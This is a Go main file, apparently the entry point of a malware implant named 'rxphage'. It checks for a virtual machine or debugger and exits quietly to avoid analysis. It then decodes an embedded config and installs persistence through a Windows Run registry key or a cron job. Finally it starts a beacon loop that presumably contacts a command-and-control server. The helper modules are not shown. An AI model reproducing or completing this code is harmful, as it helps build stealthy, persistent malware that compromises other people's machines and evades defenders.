package main

import (
	"math/rand"
	"os"
	"runtime"
	"time"

	"rxphage/beacon"
	"rxphage/config"
	"rxphage/evasion"
	"rxphage/persist"
)

func main() {
	rand.Seed(time.Now().UnixNano())

	if evasion.DetectVM() || evasion.DetectDebugger() {
		os.Exit(0)
	}

	cfg := config.Decode()

	if runtime.GOOS == "windows" {
		persist.InstallRunKey(cfg.MutexName)
	} else {
		persist.InstallCron()
	}

	beacon.Run(cfg)
}
